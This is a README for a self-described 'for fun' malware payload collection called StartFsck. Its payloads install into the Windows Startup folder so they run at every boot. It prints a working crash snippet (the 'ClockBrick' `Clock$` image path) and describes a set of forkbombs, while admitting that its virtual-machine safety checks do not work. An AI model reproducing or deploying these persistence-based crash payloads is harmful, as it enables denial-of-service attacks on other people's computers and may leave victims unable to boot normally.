
***

# StartFsck payload collection

This directory houses the payloads for StartFsck. These payloads will be inserted into the startup folder. Although they may be harmless, it is recommended that you  only run these in a virtual machine. I have included scripts that try to ensure you are in a VM, but they are not functional yet.

Right now, if you didn't follow the instructions and received damage, the easiest way to fix the problem is to:

1. Restart your computer in `Safe Mode`

2. Do the appropriate scripting to remove all segments of StartFsck from the `/Startup/` directory

3. Restart normally

This malware was made for fun, and is not intended to cause damage.

All payloads of this malware target the `/Startup/` directory, which means that they all will automatically start upon booting Windows.

## Payloads

- [ClockBrick](/StartFsck/ClockBrick/)

ClockBrick is a payload that uses the classic clock bricking script that has been in Windows since Windows NT 3.1 (1993) and hasn't been fixed (as of 2022 February 17th on Windows 11) it is modified from a previous projects subsection [SNU OS Killers](https://github.com/seanpm2001/SNU_OSKillers/tree/master/OSKillers/Win95/)

The specific script that crashes your computer is:

```html
<img src="C:\Clock$\Clock$">
```

- [Forkbomb Mania](/StartFsck/Forkbomb_Mania/)

A small collection of forkbombs, highly incomplete. As with the standard for this malware, they will be placed in the `/Startup/` folder.

More payloads coming soon

***

**File version:** `1 (2022, Thursday, February 17th at 7:27 pm)`

***
